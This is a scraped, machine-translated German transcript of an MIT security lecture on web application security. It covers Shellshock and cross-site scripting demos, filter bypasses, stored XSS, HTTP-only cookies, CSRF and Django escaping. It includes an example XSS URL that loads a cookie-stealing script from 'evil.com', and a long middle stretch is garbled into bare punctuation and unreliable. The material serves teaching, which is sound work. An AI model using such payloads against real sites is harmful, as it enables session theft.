<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🦄 🛋️ 💸 MIT-Kurs "Computer Systems Security". Vorlesung 9: Sicherheit von Webanwendungen, Teil 1 🐸 🧤 🚶🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Massachusetts Institute of Technology. Vorlesung # 6.858. "Sicherheit von Computersystemen." Nikolai Zeldovich, James Mickens. 2014 Jahr 
 Computer Sy...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>MIT-Kurs "Computer Systems Security". Vorlesung 9: Sicherheit von Webanwendungen, Teil 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ua-hosting/blog/424289/"><h3>  Massachusetts Institute of Technology.  Vorlesung # 6.858.  "Sicherheit von Computersystemen."  Nikolai Zeldovich, James Mickens.  2014 Jahr </h3><br>  Computer Systems Security ist ein Kurs zur Entwicklung und Implementierung sicherer Computersysteme.  Die Vorträge behandeln Bedrohungsmodelle, Angriffe, die die Sicherheit gefährden, und Sicherheitstechniken, die auf jüngsten wissenschaftlichen Arbeiten basieren.  Zu den Themen gehören Betriebssystemsicherheit, Funktionen, Informationsflussmanagement, Sprachsicherheit, Netzwerkprotokolle, Hardwaresicherheit und Sicherheit von Webanwendungen. <br><br>  Vorlesung 1: „Einführung: Bedrohungsmodelle“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 2: „Kontrolle von Hackerangriffen“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 3: „Pufferüberläufe: Exploits und Schutz“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 4: „Trennung von Privilegien“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 5: „Woher kommen Sicherheitssysteme?“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> <br>  Vorlesung 6: „Chancen“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 7: „Native Client Sandbox“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 8: „Netzwerksicherheitsmodell“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <br>  Vorlesung 9: „Sicherheit von Webanwendungen“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> <a name="habracut"></a><br><br>  Beginnen wir mit der zweiten Vorlesung in unserer beeindruckenden Reihe von Web-Sicherheitsgeschichten.  Ich möchte sofort mit einer kurzen Demonstration von Beispielen fortfahren, da Sie wissen, dass unsere Demos fast nie funktionieren.  Ich hoffe, Sie sehen heute keinen leeren Bildschirm. <br><br>  Die Grundidee ist, dass ich Ihnen zunächst ein Beispiel für einen Shellshock-Fehler zeigen möchte, von dem Sie vielleicht schon gehört haben.  Dies war ein ziemlich beliebtes Thema in der Literatur zur Computersicherheit. <br><br><img src="https://habrastorage.org/webt/kk/h0/hz/kkh0hzlvc4krqxabzmnwigajxo4.jpeg"><br><br>  Menschen geben einem Heartbleed-Fehler eine maximale Bewertung von 10 auf einer Gefahrenskala 10. Sie betrachten dies als den gefährlichsten Fehler, vor dem das Sicherheitssystem schützen sollte.  Ich dachte, es wäre eine großartige Idee, Ihnen eine lebendige Geschichte dieses Themas zu zeigen, die Sie Ihren Eltern nacherzählen können, damit sie verstehen, dass das Studium am Massachusetts Institute of Technology das Geld wert ist. <br><br>  Was ist die Hauptidee des Shellshock-Fehlers?  Dies ist ein wirklich gutes Beispiel dafür, warum es so schwierig ist, sichere Webanwendungen zu erstellen, die mehrere Technologien, mehrere Sprachen, mehrere Betriebssysteme usw. umfassen.  Daher besteht die Hauptidee darin, dass Shellshock die Tatsache nutzt, dass ein Angreifer eine spezielle http-Anforderung an den Server erstellen und die Header in dieser Anforderung verwalten kann.  Ich habe ein sehr einfaches Beispiel an die Tafel geschrieben. <br>  Angenommen, ein Angreifer möchte eine GET-Anfrage an ein CGI zum Thema Suche nach Katzen senden, da genau dies im Internet immer gesucht wird (nur ein Scherz).  Daher gibt es ein Fragezeichen und eine Art Standard-Host-Header mit einer URL, z. B. example.com: <br><br>  GET /querry.cgi?  Suche = Katzen <br>  Host: example.com <br>  Benutzerdefinierter Header: Benutzerdefinierter Wert <br><br>  Beachten Sie nun, dass ein Angreifer auch benutzerdefinierte Header angeben kann.  Zum Beispiel möchte ich eine Art anwendungsspezifischen Header namens Custom-Header finden, um dort einen benutzerdefinierten Wert anzugeben, da die Webanwendung einige Funktionen definieren kann, die nicht mit einfachen vordefinierten HTTP-Headern ausgedrückt werden können.  Während all dies ziemlich harmlos erscheint. <br>  Letztendlich werden jedoch viele dieser Webserver für die Verarbeitung von CGI-Skripten diese benutzerdefinierten Werte aus dem Custom-Value-Header akzeptieren und zum Festlegen von Bash-Umgebungsvariablen verwenden.  Das heißt, sie verwenden diesen benutzerdefinierten Header, um einen benutzerdefinierten Header für den Namen der Bash-Variablen zu erstellen. Sie verwenden diesen vom Angreifer bereitgestellten benutzerdefinierten Wert und verwenden ihn als Wert der Bash-Variablen.  Sobald diese Variable festgelegt ist, verarbeitet der CGI-Server den Kontext dieser Umgebung. <br><br>  Und das ist schlecht, weil Webserver keine willkürlichen Werte von diesen zufälligen "schmutzigen" Dingen nehmen sollten.  In einem bestimmten Beispiel eines Shellshock-Fehlers kann daher eine Form des Wahnsinns beginnen, wenn Sie der Bash-Variablen einen böswilligen Wert geben. <br><br><img src="https://habrastorage.org/webt/pt/e_/26/pte_26a2d3abmngljp3z9rwoiwa.jpeg"><br><br>  Grundsätzlich wird diese böswillige Definition einer Funktion in der Bash-Skriptsprache ausgewählt, und Sie sollten sich nicht über die Besonderheiten dieses Prozesses Gedanken machen.  Tatsache ist jedoch, dass dieser Teil von / bin / id nicht ausgeführt würde, wenn der Bash-Parameter korrekt eingestellt wäre.  Sie haben also gerade eine Art dumme Funktion definiert, die nichts tut und den Abfrageprozess beendet. <br><br>  Diese Zeichenfolge verwirrt den Bash-Parser jedoch und scheint über diesen Unsinn nach dem Schrägstrich zu stolpern.  Und dann sagt er: "Oh, ich könnte hier weiterhin einige Befehle analysieren und ausführen, oder?"  In diesem Fall wird einfach der Befehl bin / id ausgeführt, der einige Informationen zum Benutzer anzeigt.  Das Wesentliche an der Sicherheitsanfälligkeit ist jedoch, dass Sie anstelle von bin / id hier absolut jeden Code einfügen können! <br><br>  Ich werde ein sehr einfaches Beispiel geben, das Sie auf dem Bildschirm sehen werden.  Dies ist ein sehr einfacher Python-Server, der einfachste, den Sie sich vorstellen können.  Ich benutze hier die GET-Methode.  Diese Methode bedeutet, dass alle HTTP-Header in der Anforderung durchlaufen werden. <br><br><img src="https://habrastorage.org/webt/w4/3c/fw/w43cfwwaqjmmjxm78zug-oecus4.jpeg"><br><br><img src="https://habrastorage.org/webt/1m/mr/jf/1mmrjfhbdbu6-kpevbe24bsmhpg.jpeg"><br><br>  Hier im Header haben wir einen Wert für die Variable K und einen Wert für die Abfrage V. In diesem Fall druckt GET einfach die gefundenen Header. <br><br>  Und dann wird er etwas sehr Dummes tun - einen Systemaufruf durchführen und den Shell-Wert direkt auf den im Header angegebenen Wert setzen.  Das ist also die ganze Wurzel der Sicherheitsanfälligkeit. <br><br>  Wenn ich zum nächsten Tab gehe und den Webserver des Opfers starte, sehen wir, dass er bereit ist, Anfragen anzunehmen. <br><br><img src="https://habrastorage.org/webt/rk/jt/zg/rkjtzg52m6abnpspbgoyltcpzmc.jpeg"><br><br>  Dann kann ich meinen speziellen Shellshock-Client schreiben - er befindet sich auf der nächsten Registerkarte. <br><br><img src="https://habrastorage.org/webt/jv/jh/hc/jvjhhchuelxbtmdnkrdos_apl_0.jpeg"><br><br>  Tatsächlich ist es ganz einfach - ich definiere nur eine dieser böswilligen attack.str-Zeilen, daher hat sie zuerst solche "gekrümmten" Werte.  Und dann weiß ich einfach, dass auf der Serverseite jetzt alles nach meinem Willen gemacht wird. <br><br>  In diesem Fall habe ich etwas Harmloses verwendet - Echo "Ich besitze dein Auto."  Aber es könnte alles geben.  Sie können eine andere Bash-Shell mit dem Parameter "echo ATTACKER CMD" ausführen, dh dem Befehl des echten Angreifers, der sehr gefährlich sein kann. <br><br>  Also setze ich die Header und die Benutzeranforderung und verwende dann einfach Python, um eine HTTP-Verbindung zu erstellen und sie einfach an den Server zu senden.  Was passiert also am Ende?  Ich führe hier meinen Shellshock-Client aus. <br><br><img src="https://habrastorage.org/webt/li/y5/pf/liy5pfnb9rji1s51vi7vvwwn4bs.jpeg"><br><br>  Sie sehen, Fehler 404 ist hier aufgetreten, da es keine Rolle spielt, welche Datei ich angefordert habe. Ich füge hier einfach einen Index ein, der kein HTML enthält.  Wenn Sie jedoch hier auf der zweiten Registerkarte nachsehen, auf der der Webserver des Opfers angezeigt wird, der sich bereit erklärt hat, eine Verbindung über Port 8282 herzustellen, werden Sie feststellen, dass er meine Nachrichten "Ich besitze Ihr Auto" und "ATTACKER CMD" erhalten hat. <br><br><img src="https://habrastorage.org/webt/6t/kf/yp/6tkfyptepbhu83ggs2shp_20dys.jpeg"><br><br>  Sobald der Server des Opfers diesen Header erhalten hat, wurden sofort die Werte der Bash-Variablen festgelegt, und als Ergebnis wurde der Befehl ATTACKER CMD gestartet.  Das ist klar? <br><br>  <b>Teilnehmerin:</b> Geschieht dies, wenn ein Programm mit einem solchen Titel beginnt? <br><br>  <b>Professor:</b> Ja.  Die Einzelheiten zur Funktionsweise des Angriffs hängen daher davon ab, wie Ihr Webserver aussieht, z. B. ob Sie mit Apache arbeiten oder nicht.  Dieses Beispiel ist etwas weit hergeholt, da ich tatsächlich eine andere Bash-Shell erstellt, eine Shell-Variable festgelegt und erst dann den Prozess gestartet habe.  Sie können sich jedoch vorstellen, dass Sie die Umgebungsvariable direkt festlegen können, wenn Sie für jede eingehende Verbindung andere Prozesse erstellen. <br><br>  <b>Zielgruppe:</b> Wenn Sie also zum Code des Webservers zurückkehren, scheint es eine viel schlimmere Sicherheitsanfälligkeit als Shellshock zu geben.  Weil Sie einen Systemaufruf ausführen und den Befehl ausführen können, indem Sie den benutzerdefinierten Header auf etwas anderes setzen, und ich in diesem Beispiel den Shellshock-Fehler nicht verwenden müsste. <br><br>  <b>Professor:</b> Ja, das ist richtig. In diesem speziellen Webserver, den ich nur als Beispiel geschrieben habe, gibt es etwas, dem man für nichts vertrauen kann.  Wenn wir hier jedoch nicht Python, sondern Apache hätten, könnten wir den Umgebungswert für einen bestimmten Dienst direkt mit dem Parameter set nth festlegen.  Es gibt jedoch Server wie diesen, die einen separaten Prozess erstellen und etwas tun, das dem angegebenen Beispiel sehr ähnlich ist. <br><br><img src="https://habrastorage.org/webt/js/s4/zz/jss4zz4vwyw6dqz-4s0kzwlr-uy.jpeg"><br><br>  Ein weiteres Beispiel, das ich Ihnen geben wollte, ist das Beispiel für Cross-Site-Scripting.  Der Fehler von Shellshock war eine Art Beispiel dafür, wie wichtig die Desinfektion von Inhalten ist.  Wir haben die Tatsache besprochen, dass Sie nicht nur Eingaben von zufälligen Personen akzeptieren und diese direkt in Teams jeglicher Art verwenden sollten. <br><br>  Cross-Site-Scripting ist ein weiteres Beispiel dafür, warum möglicherweise etwas schief geht.  In diesem Beispiel habe ich einen anderen einfachen CGI-Server in Python geschrieben. <br><br><img src="https://habrastorage.org/webt/lp/oo/aw/lpooaw-togbyuns6zaxta0lp6ei.jpeg"><br><br>  Dies ist das Handle, das ausgeführt wird, wenn eine Anforderung vom Client empfangen wird.  Ich habe hier einige Überschriften für die Antwort gedruckt, und meine Antwort wird HTML-Text sein.  Wie sich herausstellt, verfügen Browser über einige Sicherheitsmechanismen, um den Angriff zu verhindern, den ich Ihnen zeigen werde.  Daher habe ich es möglich gemacht, einige der Mechanismen dieses Schutzes zu deaktivieren, indem ich diese Titelleiste am Anfang platziert habe. <br><br>  Das CGI-Skript erhält dann Zugriff auf alle Felder und CGI-Anforderungen, beginnend mit der Zeile form = cgi.FieldStorage ().  Stellen Sie sich vor, dass alles, was sich in der Zeile nach diesem Fragezeichen befindet, den Titel und die Parameter unseres Beispiels darstellt: <br><br>  GET /querry.cgi?  Suche = Katzen <br>  Host: example.com <br>  Benutzerdefinierter Header: Benutzerdefinierter Wert <br><br>  Als nächstes macht das CGI-Skript eine sehr einfache Sache - es druckt sofort den Wert von etwas, das vom Angreifer stammt.  Dies ist dieselbe Grundidee, und dies ist eine schlechte Idee, da diese Druckfunktion den resultierenden Wert direkt in den HTML-Code selbst druckt. <br><br>  Hier kann Folgendes passieren.  Angenommen, ich habe eine Reihe von Abfragen, die ich ausführen möchte.  In dieser ersten Anfrage setze ich einfach den Nachrichtenwert auf Hallo, das heißt, ich gehe zur Adresse der ersten Zeile. <br><br><img src="https://habrastorage.org/webt/q2/xl/ng/q2xlngmnjiyfdvdytmh2gfdoymq.jpeg"><br><br>  Wenn ich zu meiner Seite gehe, wird das Wort "Hallo" darauf angezeigt, da der Server direkt akzeptiert, was ich an ihn weitergebe, und "Hallo" druckt.  Also keine Überraschungen. <br><br><img src="https://habrastorage.org/webt/1t/0n/ak/1t0nakmsjq1emmcqj03bs9sosq0.jpeg"><br><br>  Ich verstehe, dass ich dort wirklich beliebigen HTML-Code übergeben kann, und wenn ich das Header-Format auf h1 setze, das heißt, ich sende die zweite Zeile, die mit Hallo endet, an den Server, sie ändert sich auch auf der Seite - Sie sehen, der Wortstil hat sich in den h1-Header-Stil geändert.  Damit es funktioniert, gebe ich die Werte direkt in die Seite ein. <br><br><img src="https://habrastorage.org/webt/gm/qy/mv/gmqymv3fbxpjzkxa5wwdvijx7vu.jpeg"><br><br>  Großartig, jetzt sind wir im Geschäft und das ist cool.  Fügen wir nun einfach den JavaScript-Code hinzu, dh wir führen die dritte von mir vorbereitete Zeile im Browser aus, in der ein bestimmtes Skript eingefügt wird, das nach dem Parameter alert ("XSS") ausgeführt wird. <br><br>  Jetzt sehen wir einen leeren Bildschirm.  Es scheint, dass wir keinen Erfolg hatten, da keine Ausgabe sichtbar ist und ich keine Warnungen bemerkt habe. <br><br><img src="https://habrastorage.org/webt/hd/mo/qr/hdmoqr8xk5ehtmumjddzqwrquns.jpeg"><br><br>  Wenn ich mir jedoch die Ausgabe des Webservers ansehe, werde ich feststellen, dass der Webserver selbst dieses endgültige Skript-Tag nicht erhalten hat.  Es scheint, dass der Browser selbst etwas Böses entdeckt hat, obwohl ich versucht habe, den XSS-Filter zu deaktivieren.  Es ist also ziemlich interessant.  Später werden wir uns diesen Schutzmechanismus genauer ansehen, aber im Moment werde ich feststellen, dass der Browser versucht, standortübergreifenden Skriptangriffen standzuhalten. <br><br>  Sie können jedoch die Tatsache nutzen, dass HTML, CSS und JavaScript äußerst komplexe Sprachen sind und schwer verständlich geschrieben sind.  Ich werde dies ausnutzen und die letzte, vierte Zeile meines Eintrags verwenden und sie in die Adressleiste des Browsers einfügen.  Dies ist eine Angriffszeichenfolge, die eine ungültige URL enthält.  Es enthält die URL des Bildes &lt;IMG “” ”&gt; und des Skript-Tags”&gt; und kann tatsächlich nicht analysiert werden.  Daher wird der Browser beim Empfang einer solchen Zeile einfach verwirrt und zeigt Informationen auf dem Bildschirm an: „Auf der Seite unter 127.0.0.1:8282 steht: XSS“.  Daher funktioniert die integrierte Cross-Site-Scripting-Erkennung nicht. <br><br><img src="https://habrastorage.org/webt/zh/sa/df/zhsadfxqyr1nqiwiy8atytitmou.jpeg"><br><br>  Wenn wir auf die Schaltfläche "OK" klicken, wird nur eine leere Seite angezeigt.  Aber wenn Sie sich den Inhalt ansehen, werden wir unverständliche Zitate und Klammern sehen, die aus dem Nichts kommen. <br><br><img src="https://habrastorage.org/webt/za/qi/yp/zaqiyp6lxm9damgqbidbi7ess3u.jpeg"><br><br>  Aus Sicht des Angreifers spielt die beschädigte Seite jedoch keine Rolle, da wir eine Warnung gesehen haben, was bedeutet, dass der Code gestartet wurde.  Und es könnte verwendet werden, um Cookies zu stehlen oder so etwas zu tun. <br><br>  <b>Zielgruppe:</b> Was ist der standortübergreifende Aspekt? <br><br>  <b>Professor: Der</b> standortübergreifende Aspekt ist, dass ein Angreifer, der einen Benutzer davon überzeugen kann, zu einer URL zu gehen, wie in diesem Beispiel, die Person ist, die den Inhalt der Nachricht bestimmt.  Er ist es, der die XSS-Warnung oder ähnliches erstellt.  Im Wesentlichen führt die Seite des Opfers Code für jemanden aus, der diese Seite nicht verwaltet. <br><br>  Also habe ich Ihnen zwei kurze Demonstrationen der „schmutzigen“ Welt gezeigt, in der wir leben.  Warum ist Cross-Site-Scripting so verbreitet?  Warum sind diese Themen so wichtig?  Der Grund dafür ist, dass Websites immer dynamischer werden und mehrere benutzergenerierte Inhalte hosten oder Inhalte aus anderen Domänen enthalten möchten.  Denken Sie beispielsweise an den Kommentarbereich eines Nachrichtenartikels. Diese Kommentare stammen von unzuverlässigen Personen - von Benutzern.  Auf die eine oder andere Weise sollten diese Websites herausfinden, welche Regeln für die Kombination solcher Dinge gelten. <br><br>  Websites können Benutzerdokumente wie Google- oder Office 365-Dokumente enthalten. Alle diese Dokumente stammen von unzuverlässigen Personen, müssen jedoch irgendwie miteinander und mit der hervorragenden Infrastruktur von Google oder Microsoft auskommen. <br><br>  Welche Arten von standortübergreifenden Sicherheitsszenarien können wir verwenden?  Eine Art des Schutzes sind Cross-Site-Scripting-Filter im Browser.  Diese Filter versuchen, mögliche Cross-Site-Scripting-Angriffe zu erkennen.  Und wir haben einen dieser Filter in Aktion gesehen - dies war das dritte Beispiel für das von uns untersuchte Szenario. <br>  Angenommen, Sie haben die URL <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">foo.com/?q=</a> &lt;script src = "evil.com/cookie stehlen.js"&gt;.  Das heißt, diese Adresse führt ein Skript aus, das den Benutzer auf eine schädliche Website umleitet und ihm Cookies stiehlt. <br><br><img src="https://habrastorage.org/webt/no/hf/b_/nohfb_nyupptbxwj4luk1whqgpw.jpeg"><br><br>  Der Browser weigert sich also, es auszuführen, und der Trick dieses Angreifers funktioniert nicht.  Der Grund ist einfach: Der Browser hat gerade überprüft, ob diese URL ein integriertes <code>&lt;script&gt;</code> , und das Klicken auf diesen Link verboten, nachdem er es gefunden hat.  Daher ist dies eine sehr einfache Heuristik, um herauszufinden, ob etwas Schädliches passiert, da kein normaler Entwickler solche Dinge in die Adresse einfügt.  Sie können die Konfigurationsoptionen Ihres Browsers so konfigurieren, dass solche Dinge aktiviert oder deaktiviert werden.  Dies ist manchmal nützlich zum Testen, wenn Sie nur schnell und ohne große Überprüfung einige JavaScript-Daten eingeben möchten.  Normalerweise ist diese Überprüfung im Browser jedoch standardmäßig aktiviert. <br><br>  Beispielsweise verfügen Chrome und IE über einen integrierten Filter, der den URL-Wert in der Adressleiste überprüft und nach ähnlichen Dingen sucht.  Und wenn sie vorhanden sind, versucht der Browser möglicherweise, sie vollständig zu entfernen oder die Quelle in &lt;&gt; leer zu machen.  Es gibt viele heuristische Analysemethoden, anhand derer Browser solche Dinge erkennen sollten.  Wenn Sie sich die OWASP-Website ansehen, gibt es Beispiele für die Verwendung einer solchen Heuristik zur Erkennung von Cross-Site-Scripting und Beispiele für die Umgehung dieses Filters. <br><br>  Weißt du, es war sehr lustig, weil ich als Beispiel für unseren Vortrag zunächst etwas Ähnliches gemacht habe und es nicht funktioniert hat.  Dann schaute ich in das OWASP-Spickzettel und fand die vierte Option, die funktionierte. Es war ein Beispiel mit einer fehlerhaften Analyse der img-Bildadresse. <br><br>  Das Hauptproblem, bei dem Sie sich nicht einfach auf die integrierten Browserfilter verlassen können, besteht darin, dass es viele verschiedene Möglichkeiten gibt, CSS- und HTML-Parser zu zwingen, einige Inhalte falsch zu analysieren.  Embedded-Lösungen sind also nicht perfekt, sie decken nicht alle Schwachstellen ab. <br><br>  <b>Teilnehmerin:</b> Aber liegt es nicht in der Verantwortung des Browsers, solche Dinge zu überprüfen? <br><br>  <b>Professor:</b> Ich meine den Fall, wenn sich der Browser auf einem Proxyserver befindet und der Proxy etwas tut, was in diesem Beispiel gezeigt wird.  Das heißt, die integrierten Filter sind sinnvoll, da der Browser viele Parser enthalten kann und diese Filter zum Schutz der Handler-Ebenen im Browser verwendet werden. <br><br>  <b>Teilnehmerin:</b> Ich denke, wir können sagen, dass es in der Verantwortung des Webentwicklers und nicht des Benutzers liegt, solche Dinge zu überprüfen. <br><br>  <b>Professor:</b> In gewissem Sinne könnte man sagen, dass es unter Unix oder Windows auch Prozesse gibt, um die sich der Softwareentwickler und nicht der Benutzer kümmern sollte, und der Entwickler sollte sicherstellen, dass diese Dinge isoliert bleiben.  In Wirklichkeit spielen aber auch das Betriebssystem und die Hardware eine wichtige Rolle, da man sonst keinem Programm von zufälligen Entwicklern vertrauen könnte.  Aber im Grunde hast du recht.  In der Tat versuchen Frameworks wie Django oder ähnliches, Ihnen dabei zu helfen, einige dieser Probleme zu umgehen. <br><br>  Auf die eine oder andere Weise sind Filter keine ideale Lösung und können so genannte persistente oder persistente Cross-Site-Scripting-Angriffe, persistente XSS, nicht verhindern.  Dies ist eine Art Reflexion, da der Skriptcode einfach in der URL "lebt".  Sobald der Benutzer diese URL geschlossen hat, wurde der Angriff beendet. <br><br>  Stellen Sie sich jedoch vor, ein Benutzer hat schädlichen HTML-Code in den Kommentaren Ihrer Website platziert.         ,          .           ,      . <br><br><img src="https://habrastorage.org/webt/ve/bq/zh/vebqzhebjjzb__fbvhmhga2tav0.jpeg"><br><br>  ,     –   .           HTML-   . <br><br>    ?  - ,          .        HTML,   ,       .         . <br><br> <b>:</b>  ,    , ,  ,           -   ? <br><br> <b>:</b>    ,      .   ,     — post.  ,   ,   XML HTTP . <br><br> <b>:</b>      ,          ,  … <br><br> <b>:</b> ,     ,      .  ,                 .      - ,    . <br><br>  ,    ,         . <br><br>       ,   « HTTP »,  HTTP-only cookie.     ,     ,    JavaScript        cookie.  ,  ,          , : «,    ,  JavaScript,     cookie»!         - . <br><br>     ,        ,    .     ,      .  ,    JavaScript     cookie,     - , ,  URL-  -   , , buy.com.      ,   , ,  Ferrari,        attacker,    . <br><br><img src="https://habrastorage.org/webt/3q/nz/v2/3qnzv2vakvuorhnvqzgzonxubvw.jpeg"><br><br>    ,  JavaScript,      cookie,  ,       URL-.  ,     CSRF ,      . <br><br>   ,     ,      ,   .    ,         ,    . ,  -   ,   ,     ,  Google, Office 365   .         . , Google              googleusercontent.com.      ,  Gmail   . -,      25-   . <br><br><img src="https://habrastorage.org/webt/xz/b0/r7/xzb0r7kx8ebddto0pynf4cuoyn4.jpeg"><br><br>       ?  ,          -     ,              google.com.     ,              google.com.          . <br><br>  ,     –     .   ,       -,    ,     .       ,                 .   —   Django.   -, ,          -. <br><br><img src="https://habrastorage.org/webt/hh/tk/em/hhtkemhitqft99764mtwlvwzssi.jpeg"><br><br> Django     ,      ,           .          –   .             CSS   ,       . ,        .  Django    ,    :   ,   . <br><br><img src="https://habrastorage.org/webt/m7/t-/tt/m7t-tthgw-nmrsbhzx0z0r_8wwi.jpeg"><br><br>    -.    ,       Django,  Django : «,     -, ,  ,    CGI».    Django     ,       ,     .  -   CGI0,    ,         . <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Django macht es jedoch viel besser - es desinfiziert Benutzerinhalte, da es einen Trick von ihm erwartet. </font><font style="vertical-align: inherit;">Es platziert einfach sofort den Wert der Namensvariablen hier und codiert ihn so, dass dieser Inhalt niemals aus dem HTML-Kontext herauskommt und JavaScript-Code oder ähnliches ausführt. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26:25 min</font></font><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">MIT-Kurs "Computer Systems Security".</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Vorlesung 9: „Sicherheit von Webanwendungen“, Teil 2</a> <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/6HhmIlbE0l0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Die 